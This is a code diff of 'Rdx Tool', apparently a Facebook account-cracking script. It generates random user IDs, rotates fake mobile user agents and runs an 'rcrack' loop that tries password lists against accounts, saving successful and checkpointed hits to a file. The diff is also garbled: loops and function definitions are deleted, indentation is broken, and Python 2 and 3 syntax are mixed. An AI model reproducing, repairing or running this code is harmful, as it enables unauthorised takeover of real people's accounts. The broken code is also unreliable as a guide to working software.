@@ -5,7 +5,6 @@
 #Reserved2023
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
 os.system('rm -rf .txt')
-for n in range(10000):
 	
     nmbr = random.randint(1111111, 9999999)
     
@@ -14,7 +13,8 @@ for n in range(10000):
     print(nmbr)
 
     sys.stdout.flush()
-  try:
+    
+try:
     import requests
 except ImportError:
     os.system('pip2 install requests')
@@ -57,7 +57,7 @@ for xd in range(10000):
     j=random.randrange(4200,4900)
     k=random.randrange(40,150)
     l='Mobile Safari/537.36'
-    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+
     ugen.append(uaku2)
 
 def i():
@@ -68,37 +68,6 @@ def i():
     os.system("clear")
     jalan(logo)
     
-limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(7))
-        user.append(nmp)
-    os.system("clear")
-    print(logo)
-    passx = int(input("[*] Enter Password Limit : ")
-   
-def acak(b):
-    w = 'ahtdzjc'
-    d = ''
-    for i in x:
-        d += '!'+w[random.randint(0,len(w)-1)]+i
-    return cetak(d)
-
-
-def cetak(b):
-    w = 'ahtdzjc'
-    for i in w:
-        j = w.index(i)
-        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
-    x += '\033[0m'
-    x = x.replace('!0','\033[0m')
-    sys.stdout.write(x+'\n')
-
-
-def jalan(z):
-	for e in z + '\n':
-		sys.stdout.write(e)
-		sys.stdout.flush()
-		time.sleep(0.001)
 
 #### colours ####
 B='\033[1;91m'
@@ -10640,15 +10609,18 @@ jalan("\033[1;97m•◈•───────•◈ IT'S NOT A NAME IT'S A BRA
 jalan("                  \033[1;93m Welcome to Rdx Tool ")  
 
 jalan("\033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
-jalan("\033[1;93m ▇▇\033[1;95m           WellCome to Rdx Tool   \033[1;93m          ▇▇")
-jalan("\033[1;93m ▇▇\033[1;91m             👇Tool Using Tips👇      \033[1;93m      ▇▇")
-jalan("\033[1;93m ▇▇\033[1;92m            Tool Update EveryDay      \033[1;93m      ▇▇")
-jalan("\033[1;93m ▇▇\033[1;92m        Termux Data Clear EveryDay    \033[1;93m ▇▇")
-jalan("\033[1;93m ▇▇\033[1;92m         Facebook Id -- Rdx       \033[1;93m              ▇▇")
+jalan("\033[1;93m ▇▇\033[1;95m           WellCome to Rdx Tool             \033[1;93m▇▇")
+jalan("\033[1;93m ▇▇\033[1;91m             👇Tool Using Tips👇            \033[1;93m▇▇")
+jalan("\033[1;93m ▇▇\033[1;92m            Tool Update EveryDay            \033[1;93m▇▇")
+jalan("\033[1;93m ▇▇\033[1;92m        Termux Data Clear EveryDay     \033[1;93m▇▇")
+jalan("\033[1;93m ▇▇\033[1;92m         Facebook Id -- Rdx                     \033[1;93m▇▇")
 jalan("\033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
 print "\033[1;95m«-----------------\033[1;91mRdx\033[1;95m-----------------»"
 CorrectUsername = "Rdx"
 CorrectPassword = "Rdx"
+
+limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
+for n in range(limit):
 
 loop = 'true'
 while (loop == 'true'):
@@ -14643,13 +14615,7 @@ def action():
 	print 44*'-'
 	print '[✓] Process Has Been Completed ....'
 	
-	def rcrack(uid,pwx,tl):
-    #print(user)
-    global loop
-    global cps
-    global oks
-    global proxy
-    try:
+try:
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
@@ -14706,14 +14672,14 @@ def action():
         loop+=1
         sys.stdout.write(' %s[ⓇDX-] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
         sys.stdout.flush()
-    except:
+except:
         pass
 
 ud()
 	
-    print '[✓] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
-	print('[✓] CP File Has Been Saved : save/checkpoint.txt')
-	print """
+print '[✓] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
+print('[✓] CP File Has Been Saved : save/checkpoint.txt')
+print """
 \033[1;91m     ♦♦♦———————————————————————————————♦♦♦
 \033[1;91m ,------. ,------. ,--.   ,--. 
 \033[1;91m |  .--. '|  .-.  \ \  `.'  /  
@@ -14730,8 +14696,8 @@ ud()
                 Facebook
               \033[1;97m Rdx"""
 	
-	raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
-	login()	
+raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
+login()	
           
 if __name__ == '__main__':
 	login()
